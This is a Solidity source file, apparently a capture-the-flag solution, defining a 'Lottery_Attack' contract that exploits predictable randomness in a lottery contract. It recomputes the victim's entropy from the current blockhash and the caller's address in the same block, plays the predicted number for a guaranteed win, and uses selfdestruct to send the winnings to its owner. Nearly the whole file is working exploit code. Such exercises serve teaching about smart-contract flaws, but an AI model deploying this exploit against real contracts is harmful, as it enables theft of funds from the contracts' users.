pragma solidity 0.4.24;

import "./lottery.sol";
import "./SafeMath.sol";

contract Lottery_Attack {
    using SafeMath for uint256;
    
    address public owner;
    address public victim_addr;
    uint256 public aTarget;
    bytes32 public bytesTarget;
    bytes32 public GlobalEntropy2;
    bytes32 public GlobalEntropy;
    
    constructor(address addr) {
        // Remember our wallet address
        owner = msg.sender;
        // Remember the victim contract
        victim_addr = addr;
    }
    
    function () payable {} // Ensure we can get paid (very important)
    
    function exploit() external payable {
        // Remember to authorize this exploit contract with the
        // CTFframework before running this exploit
        
        // First, we calculate the same entropy as the victim contract
        bytes32 entropy = blockhash(block.number);
        bytes32 entropy2 = keccak256(abi.encodePacked(msg.sender));
        bytes32 target = keccak256(abi.encodePacked(entropy^entropy2));
        bytes32 GlobalTarget = target;
        aTarget = uint256(target);
        GlobalEntropy2 = entropy2;
        GlobalEntropy = entropy;
        //bytes32 guess = keccak256(abi.encodePacked(_seed));
        
        // Because our guess is calculated by us and validated
        // by the victim contract in the same block,
        // we are guaranteed to win
        
        // While the victim still has some ether left 
        //while(address(victim_addr).balance > 0){
            // Send our guaranteed win
        Lottery(victim_addr).play.value(.001 ether)(uint256(target));
        //}
        
        // Send ourselves the profit
        selfdestruct(owner);
    }
}
